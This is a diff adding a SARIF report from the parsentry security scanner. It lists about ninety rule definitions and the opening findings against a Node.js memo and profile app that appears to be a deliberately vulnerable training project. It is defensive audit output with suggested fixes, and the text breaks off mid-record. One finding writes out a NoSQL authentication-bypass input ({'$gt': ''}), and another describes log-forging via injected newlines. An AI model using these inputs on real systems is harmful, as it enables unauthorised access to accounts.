@@ -1,0 +1,3929 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "parsentry",
+          "version": "0.17.0",
+          "information_uri": "https://github.com/HikaruEgashira/parsentry",
+          "rules": [
+            {
+              "id": "NOSQL-INJECTION",
+              "name": "NoSQLInjection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "nosql",
+                  "CWE-943",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "PLAINTEXT-PASSWORD",
+              "name": "PlaintextPasswordStorage",
+              "properties": {
+                "tags": [
+                  "security",
+                  "cryptography",
+                  "CWE-256",
+                  "CWE-261",
+                  "A02:2021"
+                ]
+              }
+            },
+            {
+              "id": "USER-ENUMERATION",
+              "name": "UserEnumeration",
+              "properties": {
+                "tags": [
+                  "security",
+                  "authentication",
+                  "CWE-204",
+                  "A07:2021"
+                ]
+              }
+            },
+            {
+              "id": "SESSION-FIXATION",
+              "name": "SessionFixation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session-management",
+                  "CWE-384",
+                  "A07:2021"
+                ]
+              }
+            },
+            {
+              "id": "LOG-INJECTION",
+              "name": "LogInjection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "logging",
+                  "CWE-117",
+                  "A09:2021"
+                ]
+              }
+            },
+            {
+              "id": "DEPRECATED-CRYPTO-LIB",
+              "name": "DeprecatedCryptoLibrary",
+              "properties": {
+                "tags": [
+                  "security",
+                  "dependency",
+                  "CWE-327",
+                  "A06:2021"
+                ]
+              }
+            },
+            {
+              "id": "WEAK-PASSWORD-POLICY",
+              "name": "WeakPasswordPolicy",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-521",
+                  "A07:2021"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "NO-RATE-LIMIT",
+              "name": "MissingRateLimiting",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-770",
+                  "CWE-307",
+                  "A04:2021"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "PLAINTEXT-PASSWORD-COMPARISON",
+              "name": "PlaintextPasswordComparison",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-256",
+                  "CWE-208",
+                  "A02:2021"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "SENSITIVE-DATA-EXPOSURE",
+              "name": "SensitiveDataExposure",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-312",
+                  "CWE-311",
+                  "OWASP-A3"
+                ]
+              }
+            },
+            {
+              "id": "REDOS",
+              "name": "RegularExpressionDenialOfService",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-1333",
+                  "CWE-400",
+                  "OWASP-A1"
+                ]
+              }
+            },
+            {
+              "id": "INCORRECT-OUTPUT-ENCODING",
+              "name": "IncorrectOutputEncodingContext",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-838",
+                  "CWE-79",
+                  "OWASP-A7"
+                ]
+              }
+            },
+            {
+              "id": "XSS",
+              "name": "StoredCrossScriptScripting",
+              "properties": {
+                "tags": [
+                  "security",
+                  "XSS",
+                  "CWE-79"
+                ]
+              }
+            },
+            {
+              "id": "MASS-ASSIGNMENT",
+              "name": "MassAssignmentViaUnsanitizedInput",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "CWE-915"
+                ]
+              }
+            },
+            {
+              "id": "XSS-CONTEXT",
+              "name": "IncorrectOutputEncodingContext",
+              "properties": {
+                "tags": [
+                  "security",
+                  "XSS",
+                  "CWE-838"
+                ]
+              }
+            },
+            {
+              "id": "STORED-XSS-001",
+              "name": "StoredCrossSiteScripting",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored-xss",
+                  "CWE-79"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "VULN-DEPENDENCY-001",
+              "name": "VulnerableMarkdownParser",
+              "properties": {
+                "tags": [
+                  "security",
+                  "dependency",
+                  "xss",
+                  "CWE-1395"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "INPUT-VALIDATION-001",
+              "name": "MissingInputValidation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "input-validation",
+                  "CWE-20"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "CSRF-001",
+              "name": "MissingCSRFProtection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "csrf",
+                  "CWE-352"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "NOSQL-INJECTION-001",
+              "name": "NoSQLInjectionViaMemoInsert",
+              "properties": {
+                "tags": [
+                  "security",
+                  "nosql-injection",
+                  "mongodb",
+                  "CWE-943"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "BROKEN-ACCESS-CONTROL-001",
+              "name": "MissingPerUserMemoFiltering",
+              "properties": {
+                "tags": [
+                  "security",
+                  "access-control",
+                  "information-disclosure",
+                  "CWE-284"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "OUTPUT-ENCODING-001",
+              "name": "MissingOutputEncoding",
+              "properties": {
+                "tags": [
+                  "security",
+                  "output-encoding",
+                  "CWE-116"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SSJS-001",
+              "name": "ServerSideJavaScriptInjectionViaEval",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-95",
+                  "RCE",
+                  "eval-injection",
+                  "OWASP-A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "SSJS-002",
+              "name": "ServerSideJavaScriptInjectionViaEvalAfterTax",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-95",
+                  "RCE",
+                  "eval-injection"
+                ]
+              }
+            },
+            {
+              "id": "SSJS-003",
+              "name": "ServerSideJavaScriptInjectionViaEvalRoth",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-95",
+                  "RCE",
+                  "eval-injection"
+                ]
+              }
+            },
+            {
+              "id": "VALIDATE-AFTER-EXEC-001",
+              "name": "ValidationAfterCodeExecution",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-20",
+                  "defense-in-depth"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-001",
+              "name": "ServerSideJavaScriptInjection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-95",
+                  "OWASP-A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-002",
+              "name": "BusinessLogicBypass",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-20"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-003",
+              "name": "MissingInputTypeValidation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-20"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-004",
+              "name": "MongoDBUpsertWithUserData",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-943"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-005",
+              "name": "MissingCSRFProtection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-352",
+                  "OWASP-A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "VULN-008-006",
+              "name": "MongoDBQueryTypeMismatch",
+              "properties": {
+                "tags": [
+                  "security",
+                  "correctness",
+                  "CWE-704"
+                ]
+              }
+            },
+            {
+              "id": "NOSQLI-001",
+              "name": "NoSQLInjectionViaWhereClause",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "nosql",
+                  "mongodb",
+                  "CWE-943"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "NOSQLI-002",
+              "name": "NoSQLInjectionDoS",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "nosql",
+                  "dos",
+                  "CWE-400"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "IDOR-001",
+              "name": "InsecureDirectObjectReference",
+              "properties": {
+                "tags": [
+                  "security",
+                  "authorization",
+                  "idor",
+                  "CWE-639"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "MISSING-FUNCTION-LEVEL-ACCESS-CONTROL",
+              "name": "MissingFunctionLevelAccessControl",
+              "properties": {
+                "tags": [
+                  "security",
+                  "access-control",
+                  "CWE-285",
+                  "A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "MASS-DATA-EXPOSURE",
+              "name": "MassDataExposure",
+              "properties": {
+                "tags": [
+                  "security",
+                  "information-disclosure",
+                  "CWE-200",
+                  "CWE-862",
+                  "A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "HARDCODED-ADMIN-FLAG",
+              "name": "HardcodedAdminFlag",
+              "properties": {
+                "tags": [
+                  "security",
+                  "access-control",
+                  "CWE-642",
+                  "A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "PRIV-ESCALATION-001",
+              "name": "MissingFunctionLevelAccessControl",
+              "properties": {
+                "tags": [
+                  "security",
+                  "access-control",
+                  "privilege-escalation",
+                  "CWE-285"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "AUTH-BYPASS-001",
+              "name": "MissingAuthorizationCheck",
+              "properties": {
+                "tags": [
+                  "security",
+                  "authorization",
+                  "CWE-862"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SSRF",
+              "name": "ServerSideRequestForgery",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-918",
+                  "OWASP-A10"
+                ]
+              }
+            },
+            {
+              "id": "XSS-REFLECTED",
+              "name": "ReflectedCrosssSiteScripting",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "OWASP-A03"
+                ]
+              }
+            },
+            {
+              "id": "INPUT-VALIDATION",
+              "name": "MissingInputValidation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-20"
+                ]
+              }
+            },
+            {
+              "id": "VULN-013-001",
+              "name": "PlaintextPasswordStorage",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-256",
+                  "OWASP-A02:2021"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-013-002",
+              "name": "PlaintextPasswordComparison",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-261",
+                  "CWE-208"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-013-003",
+              "name": "HardcodedCredentials",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-798",
+                  "OWASP-A07:2021"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-013-004",
+              "name": "DeprecatedBcryptLibrary",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-327",
+                  "OWASP-A06:2021"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "VULN-013-005",
+              "name": "SeedDataWithCredentials",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-540",
+                  "CWE-259"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "NOSQL-INJECTION-WHERE",
+              "name": "NoSQLInjectionWhereClause",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "nosql",
+                  "CWE-943",
+                  "CWE-94",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "JS-INJECTION-MONGODB",
+              "name": "ServerSideJavaScriptInjection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "javascript",
+                  "CWE-94",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "DOS-VIA-INJECTION",
+              "name": "DenialOfServiceViaInjection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "dos",
+                  "availability",
+                  "CWE-400",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "UPSERT-DATA-INTEGRITY",
+              "name": "UncontrolledUpsert",
+              "properties": {
+                "tags": [
+                  "security",
+                  "data-integrity",
+                  "CWE-20",
+                  "A04:2021"
+                ]
+              }
+            },
+            {
+              "id": "SESSION-001",
+              "name": "HardcodedSessionSecret",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session",
+                  "CWE-798"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-002",
+              "name": "MissingSecureCookieFlag",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session",
+                  "CWE-614"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-003",
+              "name": "SessionFixation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session",
+                  "CWE-384"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-004",
+              "name": "DisabledCSRFProtection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "csrf",
+                  "CWE-352"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-005",
+              "name": "NoTLSTransport",
+              "properties": {
+                "tags": [
+                  "security",
+                  "transport",
+                  "CWE-319"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-006",
+              "name": "HardcodedCryptoKey",
+              "properties": {
+                "tags": [
+                  "security",
+                  "crypto",
+                  "CWE-321"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "SESSION-007",
+              "name": "SaveUninitializedSession",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session",
+                  "CWE-400"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "SESSION-008",
+              "name": "MissingSessionMaxAge",
+              "properties": {
+                "tags": [
+                  "security",
+                  "session",
+                  "CWE-613"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "MISSING-SECURITY-HEADERS",
+              "name": "MissingSecurityHeaders",
+              "properties": {
+                "tags": [
+                  "security",
+                  "headers",
+                  "CWE-693",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "MISSING-CSRF-PROTECTION",
+              "name": "MissingCSRFProtection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "csrf",
+                  "CWE-352",
+                  "A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "TEMPLATE-AUTOESCAPE-DISABLED",
+              "name": "TemplateAutoescapeDisabled",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "NO-HTTPS-TRANSPORT",
+              "name": "NoHTTPSTransport",
+              "properties": {
+                "tags": [
+                  "security",
+                  "transport",
+                  "CWE-319",
+                  "A02:2021"
+                ]
+              }
+            },
+            {
+              "id": "MISSING-CLICKJACKING-PROTECTION",
+              "name": "MissingClickjackingProtection",
+              "properties": {
+                "tags": [
+                  "security",
+                  "clickjacking",
+                  "CWE-1021",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "MISSING-CSP",
+              "name": "MissingContentSecurityPolicy",
+              "properties": {
+                "tags": [
+                  "security",
+                  "csp",
+                  "CWE-693",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "STATIC-AFTER-SESSION",
+              "name": "StaticAssetsAfterSessionMiddleware",
+              "properties": {
+                "tags": [
+                  "security",
+                  "performance",
+                  "CWE-400",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "VULN-017-001",
+              "name": "HardcodedSessionSecret",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-798",
+                  "OWASP-A07"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-017-002",
+              "name": "HardcodedCryptoKey",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-321",
+                  "OWASP-A02"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-017-003",
+              "name": "SensitiveDataLoggedToConsole",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-532",
+                  "OWASP-A09"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-017-004",
+              "name": "MongoDBNoAuthentication",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-306",
+                  "OWASP-A07"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "VULN-017-005",
+              "name": "PathTraversalInConfigLoading",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-22",
+                  "OWASP-A01"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "VULN-017-006",
+              "name": "EmptyProductionConfig",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-1188",
+                  "OWASP-A05"
+                ],
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "VULN-017-007",
+              "name": "HardcodedApiKey",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-798",
+                  "OWASP-A07"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "VULN-017-008",
+              "name": "UnsafeDocumentWrite",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "OWASP-A03"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "OPEN-REDIRECT",
+              "name": "OpenRedirect",
+              "properties": {
+                "tags": [
+                  "security",
+                  "redirect",
+                  "CWE-601",
+                  "A01:2021"
+                ]
+              }
+            },
+            {
+              "id": "MISSING-CSP-HEADER",
+              "name": "MissingContentSecurityPolicy",
+              "properties": {
+                "tags": [
+                  "security",
+                  "headers",
+                  "xss",
+                  "CWE-693",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "SESSION-ON-STATIC-ASSETS",
+              "name": "UnnecessarySessionOnStaticAssets",
+              "properties": {
+                "tags": [
+                  "security",
+                  "performance",
+                  "session",
+                  "CWE-400"
+                ]
+              }
+            },
+            {
+              "id": "DOM-XSS-CLIENT-JS",
+              "name": "PotentialDOMBasedXSS",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "dom",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "XSS-AUTOESCAPE-DISABLED",
+              "name": "AutoescapeDisabled",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "XSS-PROFILE-FIELDS",
+              "name": "StoredXSSViaProfileFields",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored-xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "XSS-MEMO-CONTENT",
+              "name": "StoredXSSViaMemoContent",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored-xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "UNMAINTAINED-DEPENDENCY",
+              "name": "UnmaintainedSwigDependency",
+              "properties": {
+                "tags": [
+                  "security",
+                  "supply-chain",
+                  "CWE-1104",
+                  "A06:2021"
+                ]
+              }
+            },
+            {
+              "id": "IAC-001",
+              "name": "EOLBaseImage",
+              "properties": {
+                "tags": [
+                  "security",
+                  "container",
+                  "CWE-1104"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "IAC-002",
+              "name": "UnauthenticatedMongoDB",
+              "properties": {
+                "tags": [
+                  "security",
+                  "database",
+                  "CWE-306"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "IAC-003",
+              "name": "CommentedOutPermissionHardening",
+              "properties": {
+                "tags": [
+                  "security",
+                  "container",
+                  "CWE-732"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "IAC-004",
+              "name": "OutdatedMongoDBImage",
+              "properties": {
+                "tags": [
+                  "security",
+                  "database",
+                  "CWE-1104"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "IAC-005",
+              "name": "NoContainerResourceLimits",
+              "properties": {
+                "tags": [
+                  "security",
+                  "container",
+                  "CWE-770"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "IAC-006",
+              "name": "PubliclyAccessibleDatabaseURI",
+              "properties": {
+                "tags": [
+                  "security",
+                  "configuration",
+                  "CWE-668"
+                ],
+                "precision": "high"
+              }
+            },
+            {
+              "id": "IAC-007",
+              "name": "NoNetworkIsolation",
+              "properties": {
+                "tags": [
+                  "security",
+                  "container",
+                  "CWE-653"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "IAC-008",
+              "name": "NoContainerReadOnlyFilesystem",
+              "properties": {
+                "tags": [
+                  "security",
+                  "container",
+                  "CWE-276"
+                ],
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "CLEARTEXT-TRANSPORT",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-319",
+                  "A02:2021"
+                ]
+              }
+            },
+            {
+              "id": "PRIVATE-KEY-COMMITTED",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-798",
+                  "A07:2021"
+                ]
+              }
+            },
+            {
+              "id": "SELF-SIGNED-CERT",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-295",
+                  "A07:2021"
+                ]
+              }
+            },
+            {
+              "id": "NO-HSTS",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-523",
+                  "A05:2021"
+                ]
+              }
+            },
+            {
+              "id": "NO-CIPHER-CONFIG",
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-327",
+                  "A02:2021"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "NOSQL-INJECTION",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "NoSQL injection in MongoDB findOne() query. The userName parameter from req.body is passed directly as a query filter without type checking: usersCol.findOne({userName: userName}). If userName is an object like {\"$gt\": \"\"}, all users match, bypassing authentication. Fix: validate that userName is a string before querying, e.g., if (typeof userName !== 'string') return callback(error)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 572,
+                  "endLine": 609
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "d9e5f131c9dd6863e03df036a68da6c1fe7b0fd7cdb9462332583f38ec8fcd41"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "PLAINTEXT-PASSWORD",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Passwords are stored and compared in plaintext. The validateLogin function compares passwords using direct string equality (fromDB === fromUser) instead of bcrypt.compare(). The bcrypt hashing logic is commented out. All stored passwords are recoverable if the database is compromised. Fix: uncomment and use bcrypt (or replace with bcryptjs) for hashing on registration and comparison on login."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 590,
+                  "endLine": 600
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "2a44463479303df48e15762bf4019e8abbcc7c6d902d05c298bc786eebb9b8b6"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "USER-ENUMERATION",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "Login handler distinguishes between 'noSuchUser' and 'invalidPassword' error cases, returning different error messages to the client. This allows attackers to enumerate valid usernames by observing response differences. Fix: return a single generic error message such as 'Invalid username or password' for all authentication failures."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 286,
+                  "endLine": 352
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5df9dfb39c5aaf0bcbccc2657da2536f70b56faa02f1400f84e2f2a0fe107466"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "SESSION-FIXATION",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "Session is not regenerated after successful login. The handler sets session properties (userId, userName) on the existing session without calling req.session.regenerate(). An attacker who pre-sets the session cookie (via XSS, network sniffing, or subdomain cookie injection) retains access after the victim authenticates. Fix: call req.session.regenerate() before setting authenticated session properties."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 320,
+                  "endLine": 340
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "d6d55366b1b22a86d0a4b6ea4e41badee4705250fe03283801ae8d13e312893d"
+          },
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "LOG-INJECTION",
+          "ruleIndex": 4,
+          "level": "warning",
+          "message": {
+            "text": "User-supplied userName is passed directly to console.log without sanitization. An attacker can inject newline characters (\\n) to forge log entries or inject ANSI escape sequences to exploit log viewers. Fix: sanitize userName by stripping control characters before logging, or use a structured logging library that encodes values."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 290,
+                  "endLine": 295
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "c060668defd5d86e4b1e7d20d8e9bc9e99833579d7f9d861a721c63e730e8cef"
+          },
+          "properties": {
+            "confidence": 0.8
+          }
+        },
+        {
+          "ruleId": "DEPRECATED-CRYPTO-LIB",
+          "ruleIndex": 5,
+          "level": "warning",
+          "message": {
+            "text": "bcrypt-nodejs 0.0.3 is imported but the hashing is commented out. Even if re-enabled, this package is deprecated and unmaintained with known issues. Fix: replace bcrypt-nodejs with the actively maintained 'bcrypt' (native) or 'bcryptjs' (pure JS) package."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 5
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ee182cb1a36609800ca99f109714a72b99f63feaa19336afbf01f182f91f176d"
+          },
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "WEAK-PASSWORD-POLICY",
+          "ruleIndex": 6,
+          "level": "error",
+          "message": {
+            "text": "Password validation regex PASS_RE = /^.{1,20}$/ accepts any string of 1 to 20 characters. No minimum length, no complexity requirements. A password of 'a' passes validation. The commented-out fix at line 381 shows the intended stricter regex."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 377,
+                  "startColumn": 9,
+                  "endLine": 377,
+                  "endColumn": 38
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8f2f736c32a239a36370fa6411e0c46758f7822e39b2565c124213cad66127aa"
+          },
+          "properties": {
+            "confidence": 1.0
+          }
+        },
+        {
+          "ruleId": "NO-RATE-LIMIT",
+          "ruleIndex": 7,
+          "level": "warning",
+          "message": {
+            "text": "POST /signup has no rate limiting middleware. Route is registered at app.post('/signup', sessionHandler.handleSignup) with no throttling. Enables automated mass account creation and username enumeration."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 181,
+                  "startColumn": 5,
+                  "endLine": 181,
+                  "endColumn": 52
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8ece5a4bb886cee811e6bf274f3821e7e7b2b3fec27ff1105791be798c022372"
+          },
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "DEPRECATED-CRYPTO-LIB",
+          "ruleIndex": 5,
+          "level": "warning",
+          "message": {
+            "text": "Project depends on bcrypt-nodejs@0.0.3, a deprecated and unmaintained package. Even if password hashing were enabled, the underlying library may contain unpatched security issues. Replace with 'bcrypt' (native) or 'bcryptjs' (pure JS)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 5,
+                  "endLine": 9,
+                  "endColumn": 30
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "eff62df5c70d300338b6b4278ca98fd941815fd8d5f03b39df54ea2a0e18b7a3"
+          },
+          "properties": {
+            "confidence": 1.0
+          }
+        },
+        {
+          "ruleId": "PLAINTEXT-PASSWORD-COMPARISON",
+          "ruleIndex": 8,
+          "level": "error",
+          "message": {
+            "text": "validateLogin compares passwords with direct string equality (fromDB === fromUser) instead of bcrypt.compareSync. Confirms passwords are stored in plaintext and comparison is vulnerable to timing side-channel attacks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 576,
+                  "startColumn": 13,
+                  "endLine": 576,
+                  "endColumn": 39
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f2d5906bf8fd4ab128dfc35e93bd2c63bbdc1c719219626dba41644d033863fe"
+          },
+          "properties": {
+            "confidence": 1.0
+          }
+        },
+        {
+          "ruleId": "SENSITIVE-DATA-EXPOSURE",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "SSN and DOB are stored in plaintext in MongoDB and returned without encryption. The encryption code exists but is commented out. Any database compromise or MITM attack exposes PII directly."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/profile-dao.js"
+                },
+                "region": {
+                  "startLine": 391,
+                  "startColumn": 5,
+                  "endLine": 416
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/profile-dao.js"
+                },
+                "region": {
+                  "startLine": 443,
+                  "startColumn": 5,
